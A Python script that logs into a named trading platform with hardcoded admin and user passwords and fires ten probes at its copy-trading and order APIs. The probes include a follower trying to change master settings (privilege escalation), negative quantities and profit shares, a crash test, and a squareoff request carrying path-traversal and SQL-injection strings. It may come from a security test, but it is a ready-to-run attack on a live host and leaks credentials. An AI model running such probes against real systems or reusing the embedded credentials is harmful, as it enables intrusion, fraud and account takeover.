import requests
import json
import time

BASE_URL = "https://lpadmin.blackfx.com"
ADMIN_EMAIL = "lpadmin@blacktrader.com"
ADMIN_PASSWORD = "Raj1234!"
MASTER_EMAIL = "mamm@mailinator.com"
MASTER_PASSWORD = "12345678"
FOLLOWER_EMAIL = "mamf1@mailinator.com"
FOLLOWER_PASSWORD = "12345678"

# Sessions
admin_sess = requests.Session()
master_sess = requests.Session()
follower_sess = requests.Session()

print("[*] Logging into Admin...")
r_adm = admin_sess.post(f"{BASE_URL}/admin/api/login", json={"email": ADMIN_EMAIL, "password": ADMIN_PASSWORD, "remember": True}, timeout=10)
admin_token = r_adm.json().get("token")
admin_headers = {"Authorization": f"Bearer {admin_token}", "Content-Type": "application/json"}
print(f"[+] Admin Login: {r_adm.status_code}, token acquired: {bool(admin_token)}")

print("[*] Logging into Master...")
r_m_login = master_sess.post(f"{BASE_URL}/api/auth/login", json={"email": MASTER_EMAIL, "password": MASTER_PASSWORD}, timeout=10)
master_client_id = r_m_login.json().get("trader", {}).get("member_id") or "mem_11434b0b9d9d210899"
r_m_tok = master_sess.post(f"{BASE_URL}/api/auth/chart-token", timeout=10)
master_token = r_m_tok.json().get("token")
master_headers = {"Authorization": f"Bearer {master_token}", "Content-Type": "application/json"}
print(f"[+] Master Login: {r_m_login.status_code}, client_id: {master_client_id}, token: {bool(master_token)}")

print("[*] Logging into Follower...")
r_f_login = follower_sess.post(f"{BASE_URL}/api/auth/login", json={"email": FOLLOWER_EMAIL, "password": FOLLOWER_PASSWORD}, timeout=10)
follower_client_id = r_f_login.json().get("trader", {}).get("member_id")
r_f_tok = follower_sess.post(f"{BASE_URL}/api/auth/chart-token", timeout=10)
follower_token = r_f_tok.json().get("token")
follower_headers = {"Authorization": f"Bearer {follower_token}", "Content-Type": "application/json"}
print(f"[+] Follower Login: {r_f_login.status_code}, client_id: {follower_client_id}, token: {bool(follower_token)}")

findings = []

def test_endpoint(title, method, url, headers, payload=None, params=None):
    print(f"\n--- Testing: {title} ---")
    print(f"URL: {method} {url}")
    if payload is not None:
        print(f"Payload: {json.dumps(payload)}")
    try:
        if method.upper() == "POST":
            res = requests.post(url, headers=headers, json=payload, timeout=12)
        elif method.upper() == "GET":
            res = requests.get(url, headers=headers, params=params, timeout=12)
        elif method.upper() == "PUT":
            res = requests.put(url, headers=headers, json=payload, timeout=12)
        elif method.upper() == "DELETE":
            res = requests.delete(url, headers=headers, json=payload, timeout=12)
        else:
            raise ValueError(f"Unknown method {method}")
        
        print(f"Status: {res.status_code}")
        body = res.text
        if len(body) > 500:
            body = body[:500] + "... [truncated]"
        print(f"Response: {body}")
        
        return {
            "title": title,
            "method": method,
            "url": url,
            "payload": payload,
            "status_code": res.status_code,
            "response": res.text,
            "is_500": res.status_code >= 500,
            "json": res.json() if res.headers.get("content-type", "").startswith("application/json") else None
        }
    except Exception as e:
        print(f"Exception: {e}")
        return {
            "title": title,
            "method": method,
            "url": url,
            "payload": payload,
            "status_code": 0,
            "error": str(e),
            "is_500": False
        }

# Save findings to verify
results = []

# Probe 1: Follow self (MAM Master following itself)
results.append(test_endpoint(
    "MAM Master Self-Follow Loop",
    "POST",
    f"{BASE_URL}/v1/oms/real/mam/follow",
    headers=master_headers,
    payload={
        "master_client_id": master_client_id,
        "method": "multiplier",
        "multiplier": 1.0,
        "share_percent": 50.0
    }
))

# Probe 2: Negative multiplier in MAM follow
results.append(test_endpoint(
    "Negative Multiplier in MAM Follow",
    "POST",
    f"{BASE_URL}/v1/oms/real/mam/follow",
    headers=follower_headers,
    payload={
        "master_client_id": master_client_id,
        "method": "multiplier",
        "multiplier": -2.5,
        "share_percent": 50.0
    }
))

# Probe 3: Multiplier = 0 in MAM follow
results.append(test_endpoint(
    "Zero Multiplier in MAM Follow",
    "POST",
    f"{BASE_URL}/v1/oms/real/mam/follow",
    headers=follower_headers,
    payload={
        "master_client_id": master_client_id,
        "method": "multiplier",
        "multiplier": 0.0,
        "share_percent": 50.0
    }
))

# Probe 4: Share percent > 100% or negative share percent
results.append(test_endpoint(
    "Excessive Master Profit Share (>100%)",
    "POST",
    f"{BASE_URL}/v1/oms/real/mam/master",
    headers=master_headers,
    payload={
        "share_percent": 150.0,
        "display_name": "GreedyMaster"
    }
))

results.append(test_endpoint(
    "Negative Master Profit Share (<0%)",
    "POST",
    f"{BASE_URL}/v1/oms/real/mam/master",
    headers=master_headers,
    payload={
        "share_percent": -50.0,
        "display_name": "NegativeMaster"
    }
))

# Probe 5: Follower mutating Master settings directly
results.append(test_endpoint(
    "Privilege Escalation: Follower Mutates Master Settings",
    "POST",
    f"{BASE_URL}/v1/oms/real/mam/master",
    headers=follower_headers,
    payload={
        "share_percent": 10.0,
        "display_name": "HackedMaster"
    }
))

# Reset master settings cleanly back to 50%
master_sess.post(f"{BASE_URL}/v1/oms/real/mam/master", headers=master_headers, json={"share_percent": 50.0, "display_name": "mamm"})

# Probe 6: Negative quantity order placement
results.append(test_endpoint(
    "Order Placement with Negative Quantity",
    "POST",
    f"{BASE_URL}/v1/oms/real/orders",
    headers=master_headers,
    payload={
        "symbol": "BINANCE:BTCUSDT",
        "side": "BUY",
        "type": "MARKET",
        "qty": -1.0
    }
))

# Probe 7: Zero quantity order placement
results.append(test_endpoint(
    "Order Placement with Zero Quantity",
    "POST",
    f"{BASE_URL}/v1/oms/real/orders",
    headers=master_headers,
    payload={
        "symbol": "BINANCE:BTCUSDT",
        "side": "BUY",
        "type": "MARKET",
        "qty": 0.0
    }
))

# Probe 8: Empty / Malformed Symbol in Order
results.append(test_endpoint(
    "Order Placement with Empty Symbol (500 crash test)",
    "POST",
    f"{BASE_URL}/v1/oms/real/orders",
    headers=master_headers,
    payload={
        "symbol": "",
        "side": "BUY",
        "type": "MARKET",
        "qty": 0.01
    }
))

# Probe 9: Non-existent symbol
results.append(test_endpoint(
    "Order Placement with Non-Existent Symbol",
    "POST",
    f"{BASE_URL}/v1/oms/real/orders",
    headers=master_headers,
    payload={
        "symbol": "INVALID:COIN_DOES_NOT_EXIST",
        "side": "BUY",
        "type": "MARKET",
        "qty": 0.01
    }
))

# Probe 10: Bulk squareoff with arbitrary market_order_id (IDOR / Injection)
results.append(test_endpoint(
    "Bulk Squareoff with Arbitrary / Malformed IDs",
    "POST",
    f"{BASE_URL}/v1/oms/real/positions/bulk/squareoff",
    headers=follower_headers,
    payload={
        "market_order_ids": ["non_existent_id_12345", "../../etc/passwd", "' OR '1'='1"]
    }
))

with open("scratch/probe_batch_1.json", "w") as f:
    json.dump(results, f, indent=2)

print("\n[+] Batch 1 probes complete! Saved to scratch/probe_batch_1.json")
